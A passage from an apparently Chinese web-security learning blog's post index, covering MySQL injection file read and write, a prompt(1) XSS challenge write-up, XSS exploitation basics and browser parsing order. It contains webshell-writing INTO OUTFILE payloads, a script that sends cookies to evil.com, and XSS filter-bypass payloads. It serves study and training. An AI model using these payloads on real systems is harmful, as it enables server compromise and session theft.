0x04 盲注相关函数 sleep(n)：阻塞n秒。 len()：返回字符串的长度。 if(expr1,expr2,expr3)：如果expr1是TRUE ，则值为expr2; 否则为 expr3。 0x05 读文件 Load_file() 读取文件并返回该文件的内容作为一个字符串，读取失败返回NULL。 使用条件： 连接数据库的用户有file_priv权限，启动mysqld用户必须拥有对此文件读取的权限。 查看用户的file_priv权限：select User,File_priv from mysql.user; 欲读取文件必须在服务器上。 必须指定文件的绝对路径。 欲读取文件必须小于 max_allowed_packet。 查看允许最大包长度：show global variables like &quot;max_allow%&quot;; 如果secure_file_priv非NULL，则只能读取对应目录下的文件。当secure_file_priv的值为NULL ，表示限制mysqld不允许导入|导出。 查看允许读取的路径：show variables like &quot;secure_file%&quot;; 使用例子： 注意路径符号的处理，要么使用/，使用Windows的\\需要进行转义，即\\\\。 SELECT LOAD_FILE(&quot;C://TEST.txt&quot;) SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;) SELECT LOAD_FILE(&quot;C:\\\\TEST.txt&quot;) SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) CHAR(67,58,92,92,84,69,83,84,46,116,120,116)得到的是C:\\\\TEST.txt。 SELECT LOAD_FILE(0x433a5c5c544553542e747874) 0x433a5c5c544553542e747874是C:\\\\TEST.txt经过十六进制编码得到的。 0x03 写（导入）文件select … into outfile ‘filepath’ select … into dumpfile ‘filepath’ 可以把查询的行写入一个文件中。 使用条件： 连接数据库的用户有file_priv权限，且启动mysqld的用户对目录需要有写权限。 文件路径必须为绝对路径，file_name不能是一个已经存在的文件。 如果secure_file_priv非NULL，则只能读取对应目录下的文件。当secure_file_priv的值为NULL ，表示限制mysqld不允许导入|导出。当secure_file_priv的值为空白，表示可以导入任意目录。 show variables like &quot;secure_file%&quot;; 写入Webshell条件： 需要知道网站的绝对物理路径，这样导出后的webshell可访问。 写入的目录有写权限。 secure_file_priv非NULL且包含了WEB路径。 写入Webshell： select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot; into outfile &quot;X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php&quot;; select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot; into dumpfile &quot;X:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\shell.php&quot;; LINES TERMINATED BY 用于不是Union Select时。 使用格式： Select version() into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY [十六进制数据] 例子： Select user From mysql.user where user=&quot;root&quot; limit 1 into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E; 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E是经过十六进制编码后的&lt;?php @eval($_POST[sh4douu])?&gt;，Lines Terminated By就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为root，之后的一句话木马是Lines Terminated By之后的十六进制数据解码得到的字符。 此外还有FIELDS TERMINATED BY也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。 dumpfile与outfile区别： outfile 可以导出每行。dumpfile 只能导出一行（将目标文件写入同一行内； outfile不可导出二进制文件，文件会被破坏，转义等。dumpfile可导出完整可执行二进制文件。 0x04 Union SelectUNION操作符用于合并两个或多个SELECT语句的结果集。 UNION只是将两个查询结果联结起来在一列显示，并不是联结两个表。 UNION ALL和UNION不同之处在于UNION ALL会将所有符合条件的都列出来，既不去重复的值。而UNION去重。 使用条件： UNION 内部的 SELECT 语句必须拥有相同数量的列。 列也必须拥有相似的数据类型。 每条 SELECT 语句中的列的顺序必须相同。 Order by ORDER BY语句用于根据指定的列对结果集进行排序。 在SQLi中，order by用于寻找查询的列数，因为根据前面我们知道union select使用条件之一是要列数相等。 order by之后可以跟一个数字，当数字大于查询的列数时，就会报错。由此可以得知，order by允许接的最大数字就是实际查询的列数。 0x05 注释行间注释： --+（–之后一个空格） #（浏览器访问时需要编码成%23，否则被当作锚点起始） ；%00(空字节) `(反引号) 行内注释： /*注释*/ Mysql中，/*! SQL 语句 */ 这种格式里面的 SQL 语句会当正常的语句一样被解析。","categories":[{"name":"WEB漏洞学习","slug":"WEB漏洞学习","permalink":"https://sakuxa.com/categories/WEB漏洞学习/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://sakuxa.com/tags/SQL注入/"},{"name":"MySQL","slug":"MySQL","permalink":"https://sakuxa.com/tags/MySQL/"}]},{"title":"XSS学习系列Chapter 3：prompt(1) XSS挑战","slug":"0x02-XSS学习系列之练习靶场01","date":"2019-03-11T06:18:29.000Z","updated":"2019-05-21T03:55:28.402Z","comments":true,"path":"2019/03/11/0x02-XSS学习系列之练习靶场01/","link":"","permalink":"https://sakuxa.com/2019/03/11/0x02-XSS学习系列之练习靶场01/","excerpt":"prompt(1) to win是一个XSS挑战的靶场。 靶场地址：http://prompt.ml/0 目标：Payload不需要用户交互，当输入有效且能执行prompt(1)向量时，会自动提交用户的答案。并显示YOU WON字样。","text":"prompt(1) to win是一个XSS挑战的靶场。 靶场地址：http://prompt.ml/0 目标：Payload不需要用户交互，当输入有效且能执行prompt(1)向量时，会自动提交用户的答案。并显示YOU WON字样。 Level 012345function escape(input) &#123; // warm up // script should be executed without user interaction return '&lt;input type=\"text\" value=\"' + input + '\"&gt;';&#125; 没有经过任何过滤就直接输出，直接考虑闭合即可。 Payload: &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt; &quot;&gt;&lt;img src=x onerror=prompt(1)&gt; Level 112345678function escape(input) &#123; // tags stripping mechanism from ExtJS library // Ext.util.Format.stripTags var stripTagsRE = /&lt;\\/?[^&gt;]+&gt;/gi; input = input.replace(stripTagsRE, ''); return '&lt;article&gt;' + input + '&lt;/article&gt;';&#125; JS正则： 语法规则：/正则表达式主体/修饰符(可选)` /&lt;\\/?[^&gt;]+&gt;/gi`： 匹配&lt;除&gt;以外任意&gt;或&lt;/除&gt;以外任意&gt;` /gi`标识全局搜索匹配、不区分大小写。 将匹配的替换为空，因此不能出现&lt;和&gt;不能同时出现。由于一个标签即使没有最后面的&gt;也是可以被浏览器正确解析的。或者最后使用// 因此，Payload: &lt;img src=x onerror=prompt(1) // &lt;img src=x onerror=prompt(1)(空格) Level 21234567function escape(input) &#123; // v-- frowny face input = input.replace(/[=(]/g, ''); // ok seriously, disallows equal signs and open parenthesis return input;&#125; [=(]该正则含义为匹配=或(，因此这两个会被过滤。 考虑使用字符实体来替代=和(绕过，他们对应的字符实体为：&amp;#61;、&amp;#40;。 Payload： &lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt; 这里有个问题，script标签是属于Raw text elements类型的，该类型的标签的内容是不会被HTML解析器解码的，为什么该Payload还可行？ 这是因为&lt;svg&gt;标签存在的缘故： SVG 是使用 XML 来描述二维图形和绘图程序的语言。 简单来说就是处在&lt;svg&gt;标签内的内容会先被XML解析器解析，因此&amp;#40;会被解码为(。 若支持ES6，还可以使用: 12&gt; &lt;script&gt;eval.call`$&#123;'prompt\\x281)'&#125;\\`&lt;/script&gt;&gt; eval会对其进行解码。 Level 31234567function escape(input) &#123; // filter potential comment end delimiters input = input.replace(/-&gt;/g, '_'); // comment the input to avoid script execution return '&lt;!-- ' + input + ' --&gt;';&#125; 输入的内容会被输出到HTML注释之中，并且对-&gt;进行过滤，替换为-，以防对注释符号进行闭合。 使用--!&gt;来闭合注释绕过。 Payload: --!&gt;&lt;img src=x onerror=prompt(1)&gt; Level 41234567891011function escape(input) &#123; // make sure the script belongs to own site // sample script: http://prompt.ml/js/test.js if (/^(?:https?:)?\\/\\/prompt\\.ml\\//i.test(decodeURIComponent(input))) &#123; var script = document.createElement('script'); script.src = input; return script.outerHTML; &#125; else &#123; return 'Invalid resource.'; &#125;&#125; 正则限制了只能加载当前域下的脚本，不允许跨域。 但URL的格式可以形如：http://user:password@attacker.com/，表示以user:password登录attack.com。 因此这里可以考虑使用Payload：http://prompt.ml/@attacker.com/payload.js。但浏览器只支持http://prompt.ml@attacker.com/payload.js这样的，但注意到存在decodeURIComponent()函数，该函数会进行URL解码，因此我们可以将/进行URL编码为%2f以绕过。 最终Payload： http://prompt.ml%2f@attacker.com/payload.js 该题需要我们attacker.com服务器上有payload.js文件，文件内容prompt(1)。 Level 51234567function escape(input) &#123; // apply strict filter rules of level 0 // filter \"&gt;\" and event handlers input = input.replace(/&gt;|on.+?=|focus/gi, '_'); return '&lt;input value=\"' + input + '\" type=\"text\"&gt;';&#125; 过滤了&gt;和on事件句柄以及focus，会将它们替换为_。 使用事件与等号可以不在一行特性进行绕过。并且使用type=&quot;image&quot;覆盖type=&quot;text&quot;。 Payload： &quot; type=&quot;image&quot; src=x onerror =alert(1) Level 61234567891011121314151617181920212223242526272829303132function escape(input) &#123; // let's do a post redirection try &#123; // pass in formURL#formDataJSON // e.g. http://httpbin.org/post#&#123;\"name\":\"Matt\"&#125; var segments = input.split('#'); var formURL = segments[0]; var formData = JSON.parse(segments[1]); var form = document.createElement('form'); form.action = formURL; form.method = 'post'; for (var i in formData) &#123; var input = form.appendChild(document.createElement('input')); input.name = i; input.setAttribute('value', formData[i]); &#125; return form.outerHTML + ' \\n\\&lt;script&gt; \\n\\ // forbid javascript: or vbscript: and data: stuff \\n\\ if (!/script:|data:/i.test(document.forms[0].action)) \\n\\ document.forms[0].submit(); \\n\\ else \\n\\ document.write(\"Action forbidden.\") \\n\\&lt;/script&gt; \\n\\ '; &#125; catch (e) &#123; return 'Invalid form data.'; &#125;&#125; 输入形如：http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}格式的URL，会把#号前的部分作为新建表单的action属性的值，#号后面的Json格式的数据的键和值分别对应&lt;input /&gt;标签的name和value属性的值。 正常情况下可以通过将action设置成javascript等伪协议，来触发XSS，但是过滤了script:、data:。 这里涉及到的一个知识点就是JavaScript中document.forms[0].action表单DOM操作，会先选择表单中name属性值为action的输入框，如果找不到，才会选择form标签的action属性。 因此Payload： javascript:prompt(1)#{&quot;action&quot;:&quot;111&quot;} document.forms[0].action找到的不是form标签的action属性，而是name属性值为action的&lt;input /&gt;标签。 …… 参考链接 https://www.cnblogs.com/Ashenone/p/9049341.html https://blog.csdn.net/Ni9htMar3/article/details/77938899 https://blog.csdn.net/qq_35078631/article/details/77073233","categories":[{"name":"WEB漏洞学习","slug":"WEB漏洞学习","permalink":"https://sakuxa.com/categories/WEB漏洞学习/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://sakuxa.com/tags/XSS/"},{"name":"靶场","slug":"靶场","permalink":"https://sakuxa.com/tags/靶场/"}]},{"title":"XSS学习系列Chapter 2：漏洞原理","slug":"0x01-XSS学习系列之漏洞原理","date":"2019-03-11T01:42:09.000Z","updated":"2019-05-21T03:57:05.462Z","comments":true,"path":"2019/03/11/0x01-XSS学习系列之漏洞原理/","link":"","permalink":"https://sakuxa.com/2019/03/11/0x01-XSS学习系列之漏洞原理/","excerpt":"XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。","text":"XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。 一、概述0x00 XSS分类1.反射型XSS 只是简单地把用户输入的数据”反射”给浏览器，攻击时需要诱骗用户点击恶意链接，也叫”非持久型XSS”。 2.存储型XSS 会把用户输入的数据”存储”在服务器端，也叫”持久性XSS”。常见于留言板、博客文章等可以提交并展示用户输入内容的功能点。 3.DOM XSS DOM XSS是由于前端的JS操作DOM时存在漏洞。 与前两种的主要区别在于，DOM XSS是不与服务端交互的，触发XSS靠的只是客户端DOM解析，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显。 0x01 XSS特点 是一种攻击客户端的漏洞，而不是攻击服务器的漏洞。 反射型XSS与存储型XSS都先与服务器交互后返回，DOM XSS是不需要服务器参与的。 0x02 XSS危害 理论上，只要是JavaScript脚本能做的功能，XSS Payload都能做到。 窃取Cookie 钓鱼攻击 网页篡改、挂马 DoS攻击 XSS传播蠕虫 发起指定的GET/POST请求 结合CSRF漏洞进行攻击 …… 二、XSS漏洞利用0x00 窃取Cookie1.前瞻知识 document.cookie可以获取到当前用户在当前网站的Cookie值。 escape()函数用于构建合理的URL（对给定的URL进行URL编码使其符合规定）。 2.漏洞利用脚本： 123var img = document.createElement('img'); img.src='http://www.evil.com/no.php?'+escape(document.cookie);document.body.appendChild(img); 脚本原理：创建一个用于请求图片的&lt;img&gt;标签，该标签会向src属性指定的URL发起一次GET请求，我们让其src向我们的服务器发起一次GET并且让其携带Cookie作为参数。若脚本被加载并执行成功，我们通过查看我们的服务器access.log日志就能看到Cookie。也可以编写一个页面来接收Payload发送的Cookie参数。 3.其他漏洞利用代码： &lt;img src=&quot;http://www.evil.com?cookie=&#39;+document.cookie&quot;&gt;&lt;/img&gt; &lt;script&gt;new Image().src=&quot;http://www.evil.com?cookie=&quot;+document.cookie;&lt;/script&gt; 4.窃取其他信息 navigator.userAgent读取客户端UA。 5.防御 在Set-Cookie时设置Http-Only标识，设置后将不允许JavaScript读取Cookie。 0x01 钓鱼攻击1.重定向钓鱼 &lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt; 2.iframe 通过JavaScript来添加一个新的&lt;iframe&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。 0x02 其他利用参考链接： http://wps2015.org/2016/12/12/usually-used-xss-code/ https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec 三、XSS Check Cheatsheethttp://momomoxiaoxi.com/2017/10/10/XSS/ https://github.com/s0md3v/AwesomeXSS","categories":[{"name":"WEB漏洞学习","slug":"WEB漏洞学习","permalink":"https://sakuxa.com/categories/WEB漏洞学习/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://sakuxa.com/tags/XSS/"}]},{"title":"XSS学习系列Chapter 1：浏览器解析HTML文档","slug":"0x00-XSS学习系列之解析HTML文档","date":"2019-03-07T03:59:02.000Z","updated":"2019-05-21T04:00:19.703Z","comments":true,"path":"2019/03/07/0x00-XSS学习系列之解析HTML文档/","link":"","permalink":"https://sakuxa.com/2019/03/07/0x00-XSS学习系列之解析HTML文档/","excerpt":"只有理解了HTML文档解析的相关过程，才能对XSS漏洞有更深刻的认识。","text":"只有理解了HTML文档解析的相关过程，才能对XSS漏洞有更深刻的认识。 一、前端基本编码知识0x00 为什么要进行编码? 主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会引起歧义。 对于URL， &amp;用于分割多个参数，倘若有某个参数键值对为name=v&amp;lue，就会因为name参数的值v&amp;lue中携带了&amp;而造成歧义。因此需要对&amp;进行URL编码。 对于HTML， 当浏览器遇到&lt;会识别为元素定义的开始，&gt;会识别为元素的结束。倘若有&lt;div id=&quot;1&gt;&quot; &gt;&lt;/div&gt;，由于标签的属性值携带了&gt;，同样会造成歧义。因此需要属性值的&gt;需要进行HTML编码，即使用字符实体。 0x01 URL编码 RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。 编码方式， %加字符在ASCII码表中的十六进制值。 例如，/在ASCII码表中十六进制为0x2f，那么它对应的URL编码为%2f。 JavaScript中提供了3个函数用来对Url编码以得到合法的Url： escape() encodeURI（） encodeURIComponent（） 参考连接：https://www.cnblogs.com/jerrysion/p/5522673.html 0x02 HTML编码（字符实体）字符实体是一个预先定义好的转义序列。 字符实体两种表示方法: 字符实体以&amp;开头+预先定义的实体名称+;分号结束，如“&lt;”的实体名称为&amp;lt; 字符实体还可以以&amp;开头+#符号+字符在ASCII对应的十进制数字+;分号结束，如&lt;的实体编号为&amp;#60;。 字符都是有实体编号的，但有些字符是没有实体名称的。 0x03 JavaScript编码最常用的如\\uXXXX这种写法的Unicode转义序列，表示一个字符，其中xxxx表示一个16进制数字，如&lt;Unicode编码为\\u003c。 二、解析HTML文档解析一个HTML文档涉及三个主要过程：HTML解析——&gt;URL解析——JavaScript解析。 每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。 0x00 HTML解析器HTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。 当HTML解析器遇到&lt;字符，且字符后不包含/,即不是闭合标签时，状态机就会进入标签打开状态（Tag Open State），随后再进入标签名称状态（Tag Name State）、属性名称前状态（Before Attribute Name State）……最后进入数据状态（Data State）并且发布当前标签令牌（Token）。状态机处于数据状态（Data State）时，会继续上述的步骤，遇到完整的标签就发出标签令牌（Token）。 HTML解析器处于数据状态（Data State）、RCDATA 状态（RCDATA State）、属性值状态（Attribute Value State）时，字符实体会被解码为对应的字符。 例子， &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; &lt;和&gt;被编码为字符实体&amp;#60;和&amp;#62;。 当HTML解析器解析完&lt;div&gt;时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体&amp;#60;时因为处在数据状态（Data State）就会对实体进行解码为&lt;，后面的&amp;#62;同样道理被解码为&gt;。 这里会有个问题，被解码后，img是否会被解析为HTML标签而导致JS执行呢？ 答案是否定的。因为解析器在使用字符引用后不会转换到标签打开状态（Tag Open State），不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。 这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。 RCDATA 在HTML中，属于RCDATA Elements的标签有两个：textarea、title。 RCDATA Elements类型的标签可以包含文本内容和字符实体。 解析器解析到textarea、title标签的数据部分时，状态会进入RCDATA State。 前面我们提到，处于RCDATA State状态时，字符实体是会被解析器解码的。 例子， &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; &lt;和&gt;被编码为实体&amp;#60;和&amp;#62;。 解析器解析到它们时会进行解码，最终得到&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入标签打开状态（Tag Open State），因此里面的&lt;script&gt;并不会被解析为HTML标签。 事实上，任何RCDATA（textarea、title里面的数据）都不会使得状态机进入标签打开状态（Tag Open State），So if a user input wants to escape out of the CDATA context, it has to use the exact “]]&gt;” sequence without any encoding。 HTML解析规范：https://html.spec.whatwg.org/multipage/parsing.html#tokenization 0x01 URL解析器URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。 首先，要注意的是URL的Scheme部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入No Scheme状态。 例如， &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; URL编码部分的是javascript:alert(1)。 JS不会被执行，因为作为Scheme部分的&quot;javascript&quot;这个字符串被编码，导致URL解析器状态机进入No Scheme状态。 同样，URL中的:也不能被以任何方式编码，否则URL解析器的状态机也将进入No Scheme状态。 例如， &lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt; 由于:被URL编码为%3a，导致URL状态机进入No Scheme状态，JS代码不能执行。 另一个例子： &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; &quot;javascript&quot;这个字符串被实体化编码，:没有被编码,alert(2)被URL编码。 例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的Scheme部分的&quot;javascript&quot;这个字符串被编码了但JS还是被执行了？ 原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于属性值状态（Attribute Value State）时，字符实体时会被解码的，此处在href属性中，所以被实体化编码的&quot;javascript&quot;字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，Scheme部分的&quot;javascript&quot;字符串已被解码，而并不再是被实体编码的状态。 URL解析规范：https://url.spec.whatwg.org/ URL地址结构：https://blog.csdn.net/x_nirvana/article/details/50768906 0x02 JavaScript解析器JavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。 在HTML中，属于Raw text elements的标签有两个：script、style。 在Raw text elements类型标签下的所有内容块都属于该标签。 存在一条特性： 即Raw text elements类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到script、style标签的内容块（数据）部分时，状态会进入Script Data State，该状态并不在我们前面说的会解码字符实体的三条状态之中。 因此，&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;这样字符实体并不会被解码，也就不会执行JS。 形如 \\uXXXX这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。 首先，JavaScript中有三个地方可以出现Unicode字符转义序列： 字符串中（in String） Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals. 即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如\\u000A在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是会被解码，但只解释为字符串的一部分。 标识符中（in identifier names） 若Unicode转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。 例如，&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt; 被编码转义的部分为alert字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。 控制字符中（in control characters） 若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。 控制字符即&#39;、&quot;、()等。 例如，&lt;script&gt; alert\\u0028&quot;xss&quot;); &lt;/script&gt;，(进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分alert(。 因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。 总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。 例子， &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt; 被编码部分为alert(11)。 该例子中的JS不会被执行，因为控制字符被编码了。 &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt; 被编码部分为alert及括号内为12。 该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加&quot;&quot;或&#39;&#39;使其变为字符串，作为字符串也只能作为普通字符。 &lt;script&gt;alert(&#39;13\\u0027)&lt;/script&gt; 被编码处为&#39;。 该例的JS不会执行，因为控制字符被编码了，解码后的&#39;将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有&#39;来结束字符串。 &lt;script&gt;alert(&#39;14\\u000a&#39;)&lt;/script&gt; 该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。 0x03 解析顺序首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。 URL解析和JavaScript解析，它们的解析顺序要根据情况而定。 例子， &lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt; 该例子中，首先由HTML解析器对UserInput部分进行字符实体解码； 接着URL解析器对UserInput进行URL decode； 如果URL的Scheme部分为javascript的话，JavaScript解析器会再对UserInput进行解码。 所以解析顺序是：HTML解析——&gt;URL解析——&gt;JavaScript解析。 &lt;a href=# onclick=&quot;window.open(&#39;UserInput&#39;)&quot;&gt;&lt;/a&gt; 该例子中，首先由HTML解析器对UserInput部分进行字符实体解码； 接着由JavaScript解析器会再对onclick部分的JS进行解析并执行JS； 执行JS后window.open(&#39;UserInput&#39;)函数的参数会传入URL，所以再由URL解析器对UserInput部分进行解码。 因此解析顺序为：HTML解析——&gt;JavaScript解析——&gt;URL解析。 &lt;a href=&quot;javascript:window.open(&#39;UserInput&#39;)&quot;&gt; 该例子中，首先还是由HTML解析器对UserInput部分进行字符实体解码； 接着由URL解析器解析href的属性值； 然后由于Scheme为javascript，所以由JavaScript解析； 解析执行JS后window.open(&#39;UserInput&#39;)函数传入URL，所以再由URL解析器解析。 所以解析顺序为：HTML解析——&gt;URL解析——&gt;JavaScript解析——&gt;URL解析。 综合实例： &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25; &amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33; &amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30; &amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25; &amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33; &amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30; &amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25; &amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31; &amp;#x35;&amp;#x29;&quot;&gt; &lt;/a&gt; 首先HTML解析器进行解析，解析到href属性的值时，状态机进入属性值状态（Attribute Value State），该状态会解码字符实体，解码得到结果： 接着由URL解析器进行解析并解码： 再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释： 经过三轮解析解码后得到结果：&lt;a href=&quot;javascript:alert(15)&quot;&gt;&lt;/a&gt; 参考连接： https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html https://security.yirendai.com/news/share/26 https://xz.aliyun.com/t/1556 https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md","categories":[{"name":"WEB漏洞学习","slug":"WEB漏洞学习","permalink":"https://sakuxa.com/categories/WEB漏洞学习/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://sakuxa.com/tags/XSS/"},{"name":"编码与解码","slug":"编码与解码","permalink":"https://sakuxa.com/tags/编码与解码/"},{"name":"HTML文档解析","slug":"HTML文档解析","permalink":"https://sakuxa.com/tags/HTML文档解析/"}]},{"title":"文件上传漏洞（File Upload）","slug":"文件上传漏洞","date":"2019-03-05T05:28:41.000Z","updated":"2019-05-21T04:03:39.256Z","comments":true,"path":"2019/03/05/文件上传漏洞/","link":"","permalink":"https://sakuxa.com/2019/03/05/文件上传漏洞/","excerpt":"文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。","text":"文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。 一、概述0x00 漏洞常见危害 上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。 上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。 上传病毒、木马文件，并诱骗管理员或用户下载执行。 上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。 0x01 攻击条件 上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问） 上传的文件能被WEB容器解释执行。 文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。 0x02 安全的上传功能 上传目录设置为不可执行。 判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。 使用随机数重命名上传的文件及改写路径。 文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等） 0x03 文件上传功能 文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。 二、文件解析漏洞 解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。 0x00 IIS解析漏洞IIS 6.0解析漏洞 1.文件名截断，截断字符为分号（;）： 例如文件名：xx.asp;yy.jpg，会被作为xx.asp。 2.文件夹扩展名解析漏洞，/*.asp/目录下的所有文件都会被作为asp文件解析。 例如：/x.asp/y.jpg，y.jpg会被作为asp文件解析。 3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型： 